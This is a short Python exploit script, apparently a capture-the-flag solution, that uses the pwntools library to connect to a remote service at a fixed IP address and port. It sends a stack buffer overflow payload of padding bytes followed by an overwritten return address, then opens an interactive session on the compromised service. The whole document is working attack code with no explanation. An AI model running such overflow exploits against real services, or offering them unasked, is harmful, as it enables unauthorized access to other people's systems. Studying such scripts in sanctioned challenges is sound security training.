from pwn import *

r = remote('106.54.97.9', 10005)

r.sendline(b'\x00' * 0x28 + p64(0x40115B))
r.recvline()
r.interactive()
